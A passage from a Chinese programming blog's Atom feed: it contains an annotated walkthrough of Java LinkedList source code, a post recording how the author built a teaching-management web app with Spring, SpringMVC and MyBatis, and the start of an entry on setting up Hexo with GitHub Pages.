class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isElementIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断传入的index是否正确：</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isPositionIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">outOfBoundsMsg</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Index: &quot;</span>+index+<span class="string">&quot;, Size: &quot;</span>+size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkElementIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查传入的角标 是否正确：</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkPositionIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//必须大于0 ，并且不能大于当前size：</span></span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item))</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = size;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = last; x != <span class="keyword">null</span>; x = x.prev) &#123;</span><br><span class="line">                index--;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = last; x != <span class="keyword">null</span>; x = x.prev) &#123;</span><br><span class="line">                index--;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item))</span><br><span class="line">                    <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取第一个元素，不存在则抛异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">element</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队，获取第一个元素，不出队列，只是获取</span></span><br><span class="line">    <span class="comment">// 队列先进先出；不存在不抛异常，返回null</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取头结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//存在获取头结点元素，不存在返回null</span></span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队，并移除第一个元素；不存在不抛异常。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（删除第一个结点），如果不存在会抛出异常而不是返回null，存在的话会返回值并移除这个元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队(插入最后一个结点)从最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> add(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队（插入头结点），始终返回true</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offerFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addFirst(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队（插入尾结点），始终返回true</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offerLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addLast(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从前端），获得第一个元素，不存在会返回null，不会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peekFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从后端），获得最后一个元素，不存在会返回null，不会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peekLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">return</span> (l == <span class="keyword">null</span>) ? <span class="keyword">null</span> : l.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从前端），获得第一个元素，不存在会返回null，会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pollFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">return</span> (f == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队（从后端），获得最后一个元素，不存在会返回null，会删除元素（节点）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pollLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">return</span> (l == <span class="keyword">null</span>) ? <span class="keyword">null</span> : unlinkLast(l);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入栈，从前面添加  栈 后进先出</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        addFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出栈，返回栈顶元素，从前面移除（会删除）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//节点的数据结构，包含前后节点的引用和当前节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">//结点元素：</span></span><br><span class="line">        E item;</span><br><span class="line">        <span class="comment">//结点后指针</span></span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; next;</span><br><span class="line">        <span class="comment">//结点前指针</span></span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">        Node(java.util.LinkedList.Node&lt;E&gt; prev, E element, java.util.LinkedList.Node&lt;E&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.item = element;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">            <span class="keyword">this</span>.prev = prev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//迭代器：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title">listIterator</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> java.util.LinkedList.ListItr(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">ListItr</span> <span class="keyword">implements</span> <span class="title">ListIterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> java.util.LinkedList.Node&lt;E&gt; lastReturned = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">private</span> java.util.LinkedList.Node&lt;E&gt; next;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> nextIndex;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line"></span><br><span class="line">        ListItr(<span class="keyword">int</span> index) &#123;</span><br><span class="line">            next = (index == size) ? <span class="keyword">null</span> : node(index);</span><br><span class="line">            nextIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &lt; size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasNext())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line"></span><br><span class="line">            lastReturned = next;</span><br><span class="line">            next = next.next;</span><br><span class="line">            nextIndex++;</span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPrevious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">previous</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasPrevious())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line"></span><br><span class="line">            lastReturned = next = (next == <span class="keyword">null</span>) ? last : next.prev;</span><br><span class="line">            nextIndex--;</span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">nextIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">previousIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line"></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; lastNext = lastReturned.next;</span><br><span class="line">            unlink(lastReturned);</span><br><span class="line">            <span class="keyword">if</span> (next == lastReturned)</span><br><span class="line">                next = lastNext;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextIndex--;</span><br><span class="line">            lastReturned = <span class="keyword">null</span>;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned.item = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">                linkLast(e);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                linkBefore(e, next);</span><br><span class="line">            nextIndex++;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">private</span> java.util.<span class="function">LinkedList&lt;E&gt; <span class="title">superClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (java.util.LinkedList&lt;E&gt;) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.util.LinkedList&lt;E&gt; clone = superClone();</span><br><span class="line">        clone.first = clone.last = <span class="keyword">null</span>;</span><br><span class="line">        clone.size = <span class="number">0</span>;</span><br><span class="line">        clone.modCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            clone.add(x.item);</span><br><span class="line">        <span class="keyword">return</span> clone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        Object[] result = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            result[i++] = x.item;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T[] toArray(T[] a) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.length &lt; size)</span><br><span class="line">            a = (T[])java.lang.reflect.Array.newInstance(</span><br><span class="line">                    a.getClass().getComponentType(), size);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        Object[] result = a;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            result[i++] = x.item;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a.length &gt; size)</span><br><span class="line">            a[size] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">876323262645176354L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        s.writeInt(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            s.writeObject(x.item);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> size = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            linkLast((E)s.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/Java-Collection-sourcecode/Collection.jpg&quot; alt=&quot;Collection&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
    <category term="源码" scheme="https://www.fvolcano.red/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>教学管理系统web应用+SSM搭建记录</title>
    <link href="https://www.fvolcano.red/2020/InfoManageSystem-webApplication-setUp-record/"/>
    <id>https://www.fvolcano.red/2020/InfoManageSystem-webApplication-setUp-record/</id>
    <published>2020-08-16T07:23:11.000Z</published>
    <updated>2020-08-16T07:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E9%A6%96%E9%A1%B5.png"></p><p>从一份JavaWeb的作业开始不断改进。最终效果：实现了角色分工、信息增删改查、html+css界面，SSM整合。应该是我第一个用上了SSM的项目，边学边整合。<a id="more"></a></p><h1 id="项目初期"><a href="#项目初期" class="headerlink" title="项目初期"></a>项目初期</h1><p>刚准备开始做时的搭建计划：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E6%80%BB%E4%BD%93%E8%AE%A1%E5%88%92.png" alt="总体计划"></p><p>做了八天，其中整合界面（html+css）就花了一两天。从前端网站找的页面，整合过程中除了许许多多小问题，因为自己对于css和html也不是很熟悉，只处于看懂的水平，所以各种微调花了不少时间。</p><p>其中比较值得记录的应该就是抽取出来的<strong>分页功能</strong>：（后面MyBatis的PageHelper已经能够实现这个功能了）</p><h3 id="分页功能"><a href="#分页功能" class="headerlink" title="分页功能"></a>分页功能</h3><p>未完待续。</p><h1 id="SSM整合"><a href="#SSM整合" class="headerlink" title="SSM整合"></a>SSM整合</h1><h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><ol><li><p>使用IoC容器管理DataSource对象</p></li><li><p>依赖注入方式</p></li><li><p>@controller注解与tomcat管理servlet冲突</p><p>（这时还没有学SpringMVC，仍然用的servlet。）因此也不能加@Autowared标签。转而在WebUtils中实现从ioc容器中获取bean对象的方法。</p></li><li><p>开启事务</p></li></ol><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><ol><li>负责管理controller和视图层</li><li>配置中央分发器</li><li>改造所有servelt，以String的形式返回页面</li></ol><h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><ol><li>去除DAO的实现类，直接为DAO接口写相应的sql语句</li><li>动态sql实现更加强大的功能</li><li>数据库字段与JavaBean属性的对应问题解决</li><li>MyBatis的代码生成器</li><li>PageHelper帮助实现分页功能</li></ol><p><strong>总结：</strong></p><ol><li><p>遇到的最大的问题？</p><p>因为这个项目功能很简单，虽然经常也会遇到配置错误等等各种小问题，但上网搜索后一般都能够解决。所以在其中遇到的最大的困难应该就是导包了，没有Maven真的很难，特别是不知道依赖些什么包，导入的过程中因为版本等原因错误不断。</p></li><li><p>如何解决这个问题的？</p><p>首先上网搜索，无果后找SSM的项目视频，看别人导了一些什么包，之后去找包。</p></li><li><p>第一次使用SSM的感受？</p><p>因为这个项目确实很小，对于这三个框架提供的便利性并没有太深的感受。但对于他们提供的功能有了初步的认识了。比如Spring的IoC、DI自动注入、动态代理和AOP思想；SpringMVC的ModelAndView、前端控制器、拦截器和后端验证、上传下载；MyBatis的简化的DAO开发、动态sql、延迟加载和缓存机制等等。</p></li></ol><h1 id="展示效果"><a href="#展示效果" class="headerlink" title="展示效果"></a>展示效果</h1><p><strong>管理员</strong>身份：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/1.jpg" alt="登录"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/2.jpg" alt="登陆失败"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/3.jpg" alt="登陆成功，进入主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/4.jpg" alt="点击课程信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/5.jpg" alt="实现分页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/6.jpg" alt="点击添加课程"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/7.jpg" alt="点击修改"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/8.jpg" alt="点击删除"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/9.jpg" alt="点击学生信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/10.jpg" alt="修改"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/11.jpg" alt="点击查看成绩"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/12.jpg" alt="点击添加学生"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/13.jpg" alt="点击教师信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/14.jpg" alt="添加"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/15.jpg" alt="点击修改密码"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/16.jpg" alt="修改密码后跳至登陆界面"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/17.jpg" alt="退出后（之前有选择“记住我”）"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/18.jpg" alt="注销登录信息后"></p><p><strong>学生</strong>身份登录：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/19.jpg" alt="学生主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/20.jpg" alt="选课"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/21.jpg" alt="提示信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/22.jpg" alt="提示信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/23.jpg" alt="点击查看成绩"></p><p>（其余功能与管理员相同）</p><p><strong>教师</strong>身份登录：<br> <img src="/2020/InfoManageSystem-webApplication-setUp-record/24.jpg" alt="教师主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/25.jpg" alt="点击录入成绩"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/26.jpg" alt="选择某一学生"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/27.jpg" alt="点击录入"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/28.jpg" alt="录入后"></p><p>（其余功能与管理员相同）</p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="项目路径问题"><a href="#项目路径问题" class="headerlink" title="项目路径问题"></a>项目路径问题</h2><p>在Idea中修改Context（项目上下文路径）比较简单，只需要在Tomcat中配置一下就好了；但转到eclipse后，需要在server.xml中修改。</p><p>将path修改成你想要访问的项目根路径。</p><p>按下图修改后，访问路径变为 <a href="http://localhost:8080/">http://localhost:8080/</a></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E4%BF%AE%E6%94%B9.png" alt="项目路径修改"></p><h2 id="bean对象无法自动注入"><a href="#bean对象无法自动注入" class="headerlink" title="bean对象无法自动注入"></a>bean对象无法自动注入</h2><p>我在某一个JavaBean中使用了@Autowired注解，却没有将该类加入ioc容器，自然就报空指针异常了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E9%A6%96%E9%A1%B5.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;从一份JavaWeb的作业开始不断改进。最终效果：实现了角色分工、信息增删改查、html+css界面，SSM整合。应该是我第一个用上了SSM的项目，边学边整合。&lt;/p&gt;</summary>
    
    
    
    <category term="SSM" scheme="https://www.fvolcano.red/categories/SSM/"/>
    
    <category term="JavaWeb" scheme="https://www.fvolcano.red/categories/JavaWeb/"/>
    
    
    <category term="项目" scheme="https://www.fvolcano.red/tags/%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="记录" scheme="https://www.fvolcano.red/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Hexo + GitHub Pages 博客搭建记录</title>
    <link href="https://www.fvolcano.red/2020/hexo-githubPages-setUp-record/"/>
    <id>https://www.fvolcano.red/2020/hexo-githubPages-setUp-record/</id>
    <published>2020-08-15T12:57:26.000Z</published>
    <updated>2020-08-15T12:57:26.000Z</updated>
    
